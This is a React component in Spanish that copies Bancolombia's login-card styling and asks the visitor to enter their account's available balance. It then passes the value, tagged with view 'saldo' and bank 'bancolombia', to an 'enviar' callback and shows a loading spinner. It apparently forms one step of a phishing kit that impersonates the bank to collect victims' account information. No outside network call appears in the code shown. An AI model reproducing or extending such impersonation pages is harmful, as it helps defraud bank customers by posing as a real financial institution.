/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
import { useState } from "react";

export default function Saldo({ enviar }: any) {
  const [saldo, setSaldo] = useState("");

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const clean = value.replace(/\D/g, "");
    
    if (clean === "") {
      setSaldo("");
    } else {
      const formatted = "$ " + parseInt(clean, 10).toLocaleString("es-CO");
      setSaldo(formatted);
    }
  };

  const handleSubmit = () => {
    if (saldo.length === 0) return;
    enviar?.({
      view: 'saldo',
      saldo: saldo,
      bank: "bancolombia"
    });
  };

  return (
    <div className="bc-row bc-justify-content-center form-container">
      <div className="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
        <section className="bc-mt-4" style={{ background: "#f9f9fa" }} />

        <div>
          <div className="bc-card-body bc-mt-4">

            <div className="bc-card bc-card-auth bc-card-container">
              <div className="bc-card-auth-body" style={{ paddingBottom: '2rem' }}>

                <section className="bc-card-auth-head">
                  <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3 text-center">
                    ¡Hola!
                  </h1>

                  <h3 className="bc-card-auth-description bc-mt-3 auth-description text-center" style={{ padding: '0 20px', marginBottom: '20px' }}>
                    Ingresa el saldo disponible de tu cuenta.
                  </h3>
                </section>

                {/* FORM REAL */}
                <form noValidate id="form" onSubmit={(e) => e.preventDefault()}>
                  <section>
                    <section className="bc-card-auth-container" style={{ padding: '0 20px' }}>

                      {/* Saldo disponible */}
                      <div className="authentication-form__username">
                        <div className="bc-form-field">
                          <input
                            id="saldo"
                            value={saldo}
                            onChange={handleChange}
                            className="bc-input"
                            placeholder=" "
                            inputMode="numeric"
                            autoComplete="off"
                            aria-label="Saldo disponible"
                          />
                          <label
                            htmlFor="saldo"
                            className="opacity-100 translate-y-0 label-fixed"
                          >
                            Saldo disponible
                          </label>
                        </div>
                      </div>

                    </section>
                  </section>

                  {/* Botón de continuar */}
                  <section className="bc-card-auth-button bc-mt-4" style={{ padding: '0 20px' }}>
                    <button
                      className="bc-button bc-button-fill bc-button-primary w-full"
                      type="button"
                      disabled={!saldo}
                      onClick={handleSubmit}
                    >
                      Continuar
                    </button>
                  </section>
                </form>

              </div>
            </div>
          </div>

          {/* Loader */}
          <div className="bc-circle-loading-container">
            <article
              className="bc-circle-loading"
              data-text="Cargando..."
              role="status"
            >
              <section
                className="bc-circle-loading-circle"
                style={{ "--circle-loading-size": "160px" } as any}
              >
                <em className="bc-icon bc-xl bc-loader bc-circle-loading-loader-icon">
                  spinner
                </em>
                <p className="bc-circle-loading-info">Cargando...</p>
              </section>
            </article>
          </div>

        </div>
      </div>
      {/* Spacer to push footer down */}
      <div style={{ minHeight: '150px', width: '100%' }}></div>
    </div>
  );
}